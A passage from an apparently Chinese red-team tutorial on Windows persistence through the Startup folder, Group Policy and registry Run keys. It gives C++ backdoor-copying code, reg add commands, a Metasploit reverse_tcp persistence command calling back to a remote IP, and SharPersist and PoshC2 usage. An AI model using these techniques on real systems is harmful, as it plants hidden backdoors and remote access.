<p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token namespace" style="opacity:0.7">[WIN+R 输入]</span><span class="token plain"> shell:startup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\SD\AppData\Roaming\Microsoft\Windows\</span><span class="token function" style="color:#d73a49">Start</span><span class="token plain"> Menu\Programs\Startup</span><br></span></code></pre></div></div>
<p>相关键值</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210706153656188" src="/assets/images/image-20210706153656188-226510fbe53104fac647c1d2a19c5193.png" width="2840" height="1468" class="img_ev3q"></p>
<p>由于每台电脑的快速启动目录不同,可以代码实现</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;iostream&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;windows.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include   &lt;shlobj.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#pragma   comment(lib, &quot;shell32.lib&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BOOL AutoRun_Startup(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BOOL ret = false;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHAR szStartPath[MAX_PATH] = { 0 };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHAR szDestFilePath[MAX_PATH] = { 0 };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//返回快速启动目录路径到szStartPath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret = ::SHGetSpecialFolderPathA(NULL, szStartPath,CSIDL_STARTUP,TRUE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//判断是否获取成功</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (ret == TRUE)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[+]Get the quick start directory successfully！\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!]Get the quick start directory faild！\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//构造文件在快速启动目录下的路径</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">::wsprintfA(szDestFilePath,&quot;%s\\%s&quot;,szStartPath,lpszDestFileName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//复制文件到快速启动目录下</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret = ::CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (FALSE == ret)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!]Failed to save the file in the quick start directory.\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!]Successfully to save the file in the quick start directory.\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[+]Backdoor generation in quick start directory successful!\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return TRUE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int main(int argc, char* argv[])</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[*]Useage:\n    %s %s %s\n&quot;, &quot;Run_StartUp.exe&quot;, &quot;E:\\010Editor\\010 Editor\\010Editor.exe&quot;, &quot;010Editor.exe&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (argc == 3)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AutoRun_Startup(argv[1], argv[2]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">else</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf(&quot;[!]Please check the number of your parameters\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706153758201-1b6f792ba4dc347f55ae283387fbcf98.bin" width="1080" height="136" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="组策略">组策略<a href="#组策略" class="hash-link" aria-label="组策略的直接链接" title="组策略的直接链接">​</a></h3>
<p>组策略，运行<code>gpedit.msc</code>，通过组策略的“脚本(启动/关机)”项来说实现。</p>
<p>具体位置在“计算机配置→Windows设置”项下。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20171003190850302-24534656-a3bedcb3b73060e49deb9925f2a917fd.png" width="554" height="389" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动项注册表后门">启动项注册表后门<a href="#启动项注册表后门" class="hash-link" aria-label="启动项注册表后门的直接链接" title="启动项注册表后门的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="命令行">命令行<a href="#命令行" class="hash-link" aria-label="命令行的直接链接" title="命令行的直接链接">​</a></h4>
<p>注册表项可以从终端添加到运行键以实现持久性。这些键将包含对用户登录时将执行的实际负载的引用，已知使用此持久性方法的威胁因素和红队使用以下注册表位置。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Users\pentestlab\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Users\pentestlab\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Users\pentestlab\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Users\pentestlab\pentestlab.exe&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191105133636713-274677289-1aedbd34240e4f3b18bb70f810a71c79.png" width="1024" height="348" class="img_ev3q"></p>
<p>值得注意的是，<code>HKEY_CURRENT_USER</code>的改动不需要管理员权限，而更改<code>HKEY_LOCAL_MACHINE</code>却是需要管理员权限</p>
<p><strong>如果已获得提升的凭据，则最好使用本地计算机注册表位置，而不是当前用户，因为payload将在每次系统启动时执行，而与使用系统身份验证的用户无关。</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.exe&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191105133754285-890511327-53f99896b96222dac5225cb7a6d4a2e3.png" width="1024" height="414" class="img_ev3q"></p>
<p>另外两个注册表位置，这些位置可以允许红队通过执行任意payload或DLL来实现持久性。这些将在登录期间执行，并且需要管理员级别的特权。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Pentestlab </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.dll&quot;</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="metasploit">Metasploit<a href="#metasploit" class="hash-link" aria-label="Metasploit的直接链接" title="Metasploit的直接链接">​</a></h4>
<p>Metasploit Framework通过使用Meterpreter脚本和后期利用模块来支持通过注册表的持久性。Meterpreter脚本将以VBS脚本的形式创建一个payload，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该payload。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run persistence </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.2.21</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191105134006738-1014637740-55f250e8c8b14d0f2bbc6d2df8021003.png" width="1024" height="257" class="img_ev3q"></p>
<p>另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use post/windows/manage/persistence_exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> REXEPATH /tmp/pentestlab.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> </span><span class="token environment constant" style="color:#36acaa">SESSION</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> STARTUP </span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> LOCALEXEPATH C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191105134352525-1888668860-ddb8f4f68270ad043201a594df59150b.png" width="770" height="186" class="img_ev3q"></p>
<p>由于已选择<strong>USER</strong>作为选项，该模块将使用当前用户的注册表位置。</p>
<p>如果已获得系统级别的特权，则可以将该模块配置为在<strong>HKLM</strong>位置中创建注册表项。该<strong>STARTUP</strong>选项将需要改变系统。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">set</span><span class="token plain"> STARTUP SYSTEM</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="sharpersist">SharPersist<a href="#sharpersist" class="hash-link" aria-label="SharPersist的直接链接" title="SharPersist的直接链接">​</a></h4>
<p><a href="https://github.com/fireeye/SharPersist" target="_blank" rel="noopener noreferrer">SharPersist</a>是<a href="https://twitter.com/h4wkst3r" target="_blank" rel="noopener noreferrer">Brett Hawkins</a>在C＃中开发的工具，它结合了多种持久性技术，包括添加注册表运行键。该工具包可以加载到支持反射加载的各种命令和控制框架中，例如Cobalt Strike和PoshC2。以下命令将创建一个注册表项，该注册表项将从与Metasploit Framework模块相同的注册表位置执行任意payload。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t reg </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c C:\tmp\pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k </span><span class="token string" style="color:#e3116c">&quot;hkcurun&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" SharPersist –以用户身份注册" src="/assets/images/894761-20191105134518276-146109006-85858a5b1c9d936ec1d9b724f0a8139e.png" width="1024" height="216" class="img_ev3q"></p>
<p>如果已获得提升的访问权限，请修改命令以在本地计算机位置中安装注册表项，以实现所有用户的持久性。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t reg </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c C:\tmp\pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k </span><span class="token string" style="color:#e3116c">&quot;hklmrun&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">o env</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="SharPersist –注册为SYSTEM" src="/assets/images/894761-20191105134540836-1763287960-f7e10e70f0409ba879d8f2b94e2258b3.png" width="1024" height="244" class="img_ev3q"></p>
<p>SharPersist还通过<strong>RunOnce</strong>和<strong>RunOnceEx</strong>注册表项包含持久性功能。以下命令将在这些位置创建注册表项，这些注册表项将执行任意payload。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t reg </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k </span><span class="token string" style="color:#e3116c">&quot;hklmrunonce&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t reg </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k </span><span class="token string" style="color:#e3116c">&quot;hklmrunonceex&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t reg </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k </span><span class="token string" style="color:#e3116c">&quot;hkcurunonce&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" SharPersist – RunOnce注册表项" src="/assets/images/894761-20191105134604486-306364663-a88a7d5f4842f76895efb880a05ebed5.png" width="1024" height="506" class="img_ev3q"></p>
<p>SharPersist还提供了使用另一个注册表位置进行持久化的选项（<strong>UserInitMprLogonScript</strong>）。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t reg </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">k </span><span class="token string" style="color:#e3116c">&quot;logonscript&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="SharPersist –登录脚本" src="/assets/images/894761-20191105135405635-783186089-119e12e0122396e88b6dd4fcd8974f29.png" width="1024" height="301" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="poshc2">PoshC2<a href="#poshc2" class="hash-link" aria-label="PoshC2的直接链接" title="PoshC2的直接链接">​</a></h4>
<p>PoshC2支持各种持久性功能，包括注册表运行键的方法。以下命令将在目标主机中创建两个注册表项。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">install-persistence</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" PoshC2 –持久性" src="/assets/images/894761-20191105134658860-1075251955-d0642dadc4b9742e46d13fb2cbaf690a.png" width="688" height="202" class="img_ev3q"></p>
<p>注册表的“运行”项将具有IEUpdate的名称，以便看起来合法，第二个注册表项将作为墙纸隐藏在注册表中。</p>
<p><img decoding="async" loading="lazy" alt=" PoshC2 –注册表运行键" src="/assets/images/894761-20191105134710750-575089410-386aae096daf36b1628b5ef4541c72d8.png" width="822" height="210" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="empire">Empire<a href="#empire" class="hash-link" aria-label="Empire的直接链接" title="Empire的直接链接">​</a></h4>
<p>如果将Empire用作命令和控件，Empire包含两个与通过注册表运行项与持久性技术对齐的模块。根据特权级别，这些模块将尝试在以下注册表位置中安装base64payload：</p>
